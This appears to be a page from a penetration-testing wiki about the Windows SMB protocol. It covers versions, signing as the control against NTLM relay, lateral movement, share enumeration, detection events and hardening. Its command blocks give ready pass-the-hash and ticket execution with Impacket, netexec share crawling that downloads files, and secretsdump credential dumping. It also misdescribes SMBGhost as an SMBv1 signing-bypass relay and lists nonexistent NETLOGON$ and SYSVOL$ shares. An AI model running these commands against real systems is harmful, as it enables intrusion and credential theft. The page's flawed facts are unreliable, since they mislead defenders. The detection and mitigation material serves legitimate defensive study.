---
title: SMB (Server Message Block)
type: concept
created: 2026-09-06
updated: 2026-09-06
tags: [protocol, smb, lateral-movement, active-directory, relay]
---

# SMB (Server Message Block)

**SMB** is the Windows file/printer sharing protocol — the wire protocol
behind every "connect to a share," "run `psexec.py`," "relay to SMB," and "dump
the DC" in this wiki. It's the *transport* most AD attacks move over after
initial access: lateral movement ([`psexec.py`]/`wmiexec.py`/`smbexec.py`),
NTLM relaying ([[ntlm-relay-coercion]]), and SMB signing/encryption as the
control that decides whether a relay works. Understand SMB and you understand
the "how do I actually get onto that next box" question. See [[pass-the-hash-and-ticket]]
for the exec-over-SMB technique and [[ntlm]] for the auth SMB carries.

## Versions (the ones that matter for attacks)

- **SMBv1 (CIFS)** — the legacy version. No mandatory signing, supports
  anonymous sessions, and is the classic **relay target** (and the home of
  **SMBGhost** — a v1 relay that bypasses signing on specific builds).
  Deprecated; if it's on, it's usually exploitable.
- **SMBv2/v3** — the modern versions. Signing (and v3, encryption) can be
  enforced; relaying requires the signing to be off or bypassed. Most
  current lateral movement and relays target v2/v3.

## SMB signing — the relay control

**Signing** makes each SMB message authenticated (MAC over the session key),
so a captured NTLM challenge/response can't be replayed to a *different*
SMB server without the key. This is why **SMB signing is enforced** in
hardened environments and why a relay to SMB fails when signing is on:

- **Signing enforced** → an attacker who captures `V`'s NTLM can't relay it to
  a second SMB target (the session key won't match).
- **Signing not enforced** → classic NTLM relay works: capture `V`'s NTLM
  (via [[mitm6]]/coercion) and replay it to another SMB server as `V`.

This is the single most important SMB setting for the relay family
([[ntlm-relay-coercion]], [[rbcd-via-ntlm-relay]]). See
[[ad-tiering-and-hardening]] for the "enforce SMB signing" control.

## Lateral movement over SMB (the exec path)

Once you have a credential (NTLM hash, Kerberos ticket, or password), the
SMB-based exec tools run a process on the target in that context:

```bash
# Impacket — exec on target using a hash or a ticket
psexec.py  -hashes <lm>:<nt>  CORP/user@<target>     # NTLM (PtH)
psexec.py  -k -no-pass        CORP/user@<target>     # Kerberos ticket (PtT)
wmiexec.py -hashes <lm>:<nt>  CORP/user@<target>     # WMI over DCOM (quieter)
smbexec.py -hashes <lm>:<nt>  CORP/user@<target>     # interactive SMB shell
atexec.py  -hashes <lm>:<nt>  CORP/user@<target>     # via the Task Scheduler (no service)
```
Each needs the credential to be **valid for the target** (a local account, or a
domain account that's local admin there). See [[pass-the-hash-and-ticket]] for
the PtH/PtT mechanics and [[netexec]] for mass exec/scanning across many
targets.

### Why SMB is the default lateral path
- Works with **any credential type** (password, hash, ticket).
- No agent needed on the target (vs. a beacon).
- The target's **SMB service** is the attack surface — not a specific app.

## Enumeration over SMB

- **Anonymous / null session** (SMBv1 or misconfigured v2) — list shares,
  sometimes read files with no auth.
- **Share enumeration** — `ADMIN$`, `C$`, `NETLOGON$`, `SYSVOL$`, `IPC$`
  (the `IPC$` pipe is what `psexec`/WMI use).
- **SAM/SECURITY/SYSTEM via `C$`/`ADMIN$`** — grab the registry hives for an
  offline [[sam-database]] / [[ntds-dit]] dump (needs admin).

```bash
nxc smb 10.0.0.0/24 -u user -p pass --shares            # readable/writable shares across a subnet ((Pwn3d!) = local admin)
nxc smb 10.0.0.10  -u '' -p '' --shares                 # null-session shares
smbclient -L //10.0.0.10 -N                             # list shares anonymously
smbmap  -H 10.0.0.10 -u user -p pass -R                 # recurse + show read/write perms
nxc smb 10.0.0.0/24 -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True   # crawl shares + loot files
# Grab the hives for an offline dump (needs local admin on the target):
secretsdump.py -hashes :<nt> CORP/user@target           # SAM + LSA + (on a DC) NTDS
```

## Detection

- **4624 Logon Type 3 (Network)** — an SMB logon; with **Key Length 0** it's
  an NTLM (hash) auth, not Kerberos (the PtH tell). See [[ntlm]] /
  [[pass-the-hash-and-ticket]].
- **4624/4648 with an NTLM auth where Kerberos is expected** — the relay/PtH
  signal.
- **Anonymous SMB connections** (null session 4624/4672) — SMBv1 or
  misconfig.
- **SMB from a non-Windows source IP** — Linux doing SMB (Impacket) is a
  strong tell.
- **Mass SMB exec** — many `IPC$`/`ADMIN$` connects from one host
   ([[netexec]]).

## Mitigations

- **Enforce SMB signing** (domain-wide) — the primary relay control
  ([[ad-tiering-and-hardening]]).
- **Disable SMBv1** — removes the anonymous + SMBGhost surface.
- **SMBv3 encryption** for sensitive shares.
- **Restrict `ADMIN$`/`C$`/`SYSVOL$`** ACLs; limit who has admin shares access.
- **Alert on Type-3 logons with Key Length 0** (NTLM-over-SMB) and on
  SMB from non-Windows hosts.

## Links

- [[pass-the-hash-and-ticket]] — the exec-over-SMB technique (PtH/PtT)
- [[ntlm]] — the auth SMB carries (and what signing protects)
- [[ntlm-relay-coercion]] — the relay family SMB signing gates
- [[mitm6-ipv6-relay]] — the coercion that feeds an SMB relay
- [[netexec]] — mass SMB scanning/exec
- [[impacket]] — the `psexec`/`wmiexec`/`smbexec`/`atexec` scripts
- [[ad-tiering-and-hardening]] — the signing/encryption controls
- [[remote-execution]] — the full exec-transport decision table SMB's tools sit in
- [[printer-bug]] — the spooler coercion that makes a host auth over SMB to you
- [[wpad]] — the ambient capture whose relay lands on SMB
- [[lsass]], [[sam-database]], [[ntds-dit]] — what you pull over `C$`/`ADMIN$`

## References

- [Microsoft: SMB protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/)
- [ired.team: SMB](https://www.ired.team/windows-offensive-security/smb)
- [SMBGhost (relay bypass)](https://github.com/dirkjanm/SMBGhost)
